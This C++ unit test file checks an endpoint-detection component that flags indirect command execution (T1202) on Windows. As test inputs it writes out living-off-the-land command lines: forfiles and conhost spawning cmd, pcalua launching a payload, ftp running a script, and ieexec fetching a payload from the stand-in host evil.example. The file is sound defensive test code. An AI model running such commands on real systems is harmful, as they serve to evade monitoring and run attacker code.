/*
 * indirect_exec_detector_tests.cpp - Unit tests for
 * IndirectExecDetector (T1202).
 */
#include "indirect_exec_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "indirect_exec_detector.h"

namespace {

#define IE_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "indirect exec detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* script) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kImage] =
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    event.fields[edr::field::kScriptBlockText] = script;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kIndirectExecScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunIndirectExecDetectorTests() {
    std::fprintf(stderr, "[indirect-exec] TestDisabled\n");
    {
        edr::IndirectExecDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            9000 * kSecond, "C:\\Windows\\System32\\forfiles.exe",
            "forfiles /p C:\\Windows\\System32 /m notepad.exe /c "
            "\"cmd /c calc.exe\"");
        detector.Enrich(event);
        IE_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[indirect-exec] TestForfiles\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            9000 * kSecond, "C:\\Windows\\System32\\forfiles.exe",
            "forfiles /p C:\\Windows\\System32 /m notepad.exe /c "
            "\"cmd /c calc.exe\"");
        detector.Enrich(event);
        IE_CHECK(Score(event) == "90");
        IE_CHECK(event.fields.at(
            edr::field::kIndirectExecVerdict) == "malicious");
    }
    std::fprintf(stderr, "[indirect-exec] TestPcalua\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            9001 * kSecond, "C:\\Windows\\System32\\pcalua.exe",
            "pcalua.exe -a C:\\Temp\\payload.exe");
        detector.Enrich(event);
        IE_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[indirect-exec] TestIeexec\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            9002 * kSecond, "C:\\Windows\\Microsoft.NET\\Framework\\"
                            "v4.0.30319\\ieexec.exe",
            "ieexec.exe https://evil.example/payload.exe");
        detector.Enrich(event);
        IE_CHECK(Score(event) == "80");
    }
    std::fprintf(stderr, "[indirect-exec] TestConhostHeadless\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            9003 * kSecond, "C:\\Windows\\System32\\conhost.exe",
            "conhost.exe --headless cmd.exe /c whoami");
        detector.Enrich(event);
        IE_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[indirect-exec] TestFtpScript\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            9004 * kSecond, "C:\\Windows\\System32\\ftp.exe",
            "ftp.exe -s:C:\\Temp\\commands.txt");
        detector.Enrich(event);
        IE_CHECK(Score(event) == "70");
        IE_CHECK(event.fields.at(
            edr::field::kIndirectExecVerdict) == "suspicious");
    }
    std::fprintf(stderr, "[indirect-exec] TestScriptPlaneForfiles\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            9005 * kSecond,
            "forfiles /p C:\\Users\\Public /m *.exe /c \"cmd /c start @file\"");
        detector.Enrich(event);
        IE_CHECK(Score(event) == "90");
    }
    std::fprintf(stderr, "[indirect-exec] TestBenignSilent\n");
    {
        edr::IndirectExecDetector detector(true, 55, 300, 1024);
        edr::Event bareForfiles = ProcEvent(
            9006 * kSecond, "C:\\Windows\\System32\\forfiles.exe",
            "forfiles.exe");
        detector.Enrich(bareForfiles);
        IE_CHECK(Score(bareForfiles).empty());

        edr::Event bareFtp = ProcEvent(
            9007 * kSecond, "C:\\Windows\\System32\\ftp.exe",
            "ftp.exe");
        detector.Enrich(bareFtp);
        IE_CHECK(Score(bareFtp).empty());

        edr::Event notepad = ProcEvent(
            9008 * kSecond, "C:\\Windows\\System32\\notepad.exe",
            "notepad.exe C:\\notes.txt");
        detector.Enrich(notepad);
        IE_CHECK(Score(notepad).empty());
    }
    std::fprintf(stderr, "[indirect-exec] all passed\n");
}
